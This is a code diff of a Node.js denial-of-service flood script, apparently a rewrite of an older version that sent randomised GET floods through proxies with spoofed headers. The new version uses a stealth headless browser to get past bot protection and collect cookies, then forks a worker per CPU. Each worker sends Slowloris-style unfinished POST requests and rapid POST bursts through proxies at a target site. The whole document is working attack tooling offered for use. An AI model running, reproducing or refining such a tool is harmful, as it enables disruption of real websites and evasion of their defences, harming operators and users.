@@ -1,55 +1,97 @@
-require('events').EventEmitter.defaultMaxListeners = 0;
-const CloudflareBypasser = require('cloudflare-bypasser');
-const cryptoRandomString = require('crypto-random-string');
-const path = require('path');
+const puppeteer = require('puppeteer-extra');
+const StealthPlugin = require('puppeteer-extra-plugin-stealth');
+const randomUseragent = require('random-useragent');
+const axios = require('axios');
 const fs = require('fs');
-var colors = require('colors');
-var random_useragent = require('random-useragent');
-let cf = new CloudflareBypasser();
+const cluster = require('cluster');
+const numCPUs = require('os').cpus().length;
+const colors = require('colors');
 
-if (process.argv.length !== 4) {
-    console.log(`
-    node proxy.js (web) (time)
-`);
-	Array.prototype.random = function (length) {return this[Math.floor((Math.random()*length))];}
-	var color = ['yellow', 'cyan', 'magenta', 'red', 'green', 'blue', 'rainbow']
-	var rcolor = color.random(color.length)
-	console.log(("GO")[rcolor]);
+// CONFIG
+const TARGET = process.argv[2];
+const THREADS = parseInt(process.argv[3]) || numCPUs;
+const DURATION = parseInt(process.argv[4]) || 60;
+const PROXY_LIST = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
+
+puppeteer.use(StealthPlugin());
+
+async function getSession(proxy) {
+  const browser = await puppeteer.launch({
+    headless: true,
+    args: [
+      `--proxy-server=http://${proxy}`,
+      '--no-sandbox',
+      '--disable-setuid-sandbox'
+    ]
+  });
+
+  const page = await browser.newPage();
+  const ua = randomUseragent.getRandom();
+  await page.setUserAgent(ua);
+  await page.goto(TARGET, { waitUntil: 'domcontentloaded', timeout: 30000 });
+
+  const cookies = await page.cookies();
+  const cookieHeader = cookies.map(c => `${c.name}=${c.value}`).join('; ');
+
+  await browser.close();
+  return { cookieHeader, userAgent: ua, proxy };
+}
+
+async function flood(session) {
+  const [ip, port] = session.proxy.split(':');
+
+  // Gửi POST + Slowloris (không kết thúc request)
+  const slowlorisSocket = require('net').createConnection({ host: ip, port: parseInt(port) }, () => {
+    slowlorisSocket.write(`POST ${TARGET} HTTP/1.1\r\n`);
+    slowlorisSocket.write(`Host: ${TARGET.replace(/https?:\/\//, '')}\r\n`);
+    slowlorisSocket.write(`User-Agent: ${session.userAgent}\r\n`);
+    slowlorisSocket.write(`Cookie: ${session.cookieHeader}\r\n`);
+    slowlorisSocket.write(`Content-Length: 1000000\r\n`);
+    // Không kết thúc request, tiếp tục giữ kết nối
+  });
+
+  // Axios POST gửi nhanh
+  axios.post(TARGET, {
+    data: 'burst=' + Math.random()
+  }, {
+    headers: {
+      'User-Agent': session.userAgent,
+      'Cookie': session.cookieHeader,
+      'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    proxy: {
+      host: ip,
+      port: parseInt(port)
+    },
+    timeout: 5000
+  }).catch(() => { });
+}
+
+async function start() {
+  const proxy = PROXY_LIST[Math.floor(Math.random() * PROXY_LIST.length)];
+  try {
+    const session = await getSession(proxy);
+    console.log(`[✓] Bypass: ${proxy}`.green);
+    setInterval(() => flood(session), 500); // Gửi liên tục
+  } catch (e) {
+    console.log(`[X] Fail Proxy: ${proxy}`.red);
+  }
+}
+
+if (cluster.isMaster) {
+  console.log(`Starting attack on ${TARGET} with ${THREADS} threads for ${DURATION}s`.cyan);
+  for (let i = 0; i < THREADS; i++) {
+    cluster.fork();
+  }
+
+  setTimeout(() => {
+    console.log('Attack ended.'.yellow);
     process.exit(0);
+  }, DURATION * 1000);
+} else {
+  (async () => {
+    while (true) {
+      await start();
+    }
+  })();
 }
-
-const target = process.argv[2],
-    time = process.argv[3];
-console.log("Attack Sent!")
-let proxies = fs.readFileSync('proxy.txt', 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);
-function randomNumber(min, max) {
-    return Math.floor(Math.random() * (max - min) + min);
-}
-
-function send_req() {
-	let proxy = proxies[Math.floor(Math.random() * proxies.length)];
-		var Array_method = ['GET'];
-		var randommethod = Array_method[Math.floor(Math.random()*Array_method.length)];
-		cf.request({
-			method: randommethod,
-			resolveWithFullResponse: true,
-			headers: {'User-Agent': random_useragent.getRandom(),'Referer': target,'Connection':'Keep-Alive','Keep-Alive': 'timeout=10, max=100','X-Forwarded-For': randomNumber(1, 255)+'.'+randomNumber(1, 255)+'.'+randomNumber(1, 255)+'.'+randomNumber(1, 255),},
-			proxy: 'http://' + proxy,
-			uri: target + '?' + cryptoRandomString({length: 1, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'}) +'=' + cryptoRandomString({length: 16}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 16}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 16})+ '&' + cryptoRandomString({length: 1, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'}) +'=' + cryptoRandomString({length: 16}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 16}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 16}),
-		}).then(res => {});	}
-
-setInterval(() => {
-	send_req();
-});
-
-setTimeout(() => {
-    console.log('Attack ended.');
-    process.exit(0)
-}, time * 1000);
-
-process.on('uncaughtException', function (err) {
-   
-});
-process.on('unhandledRejection', function (err) {
-   
-});
